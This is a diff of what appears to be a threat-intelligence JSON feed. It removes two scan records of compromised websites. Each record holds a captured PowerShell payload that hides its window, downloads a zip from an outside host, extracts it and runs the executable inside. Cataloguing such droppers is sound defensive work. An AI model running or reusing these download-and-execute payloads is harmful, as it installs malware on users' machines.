@@ -3561,44 +3561,5 @@
     ],
     "ReportId": "cmwclwpgw0a210omltnipi6za",
     "ScannedAt": "2026-11-11T21:03:56.705000+00:00"
-  },
-  {
-    "UrlDomain": "hublerfotoceramica.com.br",
-    "DeliveryUrl": [
-      "istile-c-cloud.beer",
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "77.37.53.103"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwcf8b7j07s00omljo01l4y5",
-    "ScannedAt": "2026-11-11T17:57:00.720000+00:00"
-  },
-  {
-    "UrlDomain": "mespo.net",
-    "DeliveryUrl": [
-      "swingerwives.com"
-    ],
-    "PayloadUrl": [
-      "https://swingerwives.com"
-    ],
-    "IP": [
-      "77.37.53.31"
-    ],
-    "Related": [],
-    "Payload": "$t=$env:APPDATA+[char]92+\"n\";$z=$t+[char]92+\"n.zip\";New-Item -Path $t -ItemType Directory -Force|Out-Null;curl.exe -sL -o $z \"https://swingerwives[.]com\";tar.exe -xf $z -C $t;Remove-Item $z;$e=Get-ChildItem $t -Recurse -Filter \"Beautifull.exe\"|Select-Object -First 1;if($e){$w=[wmiclass]\"Win32_Process\";$w.Create($e.FullName)|Out-Null};exit",
-    "ResolvedDownloadUrl": [
-      "https://swingerwives.com"
-    ],
-    "ReportId": "cmwcf73lu07rj0omlahvm476x",
-    "ScannedAt": "2026-11-11T17:56:04.253000+00:00"
   }
 ]
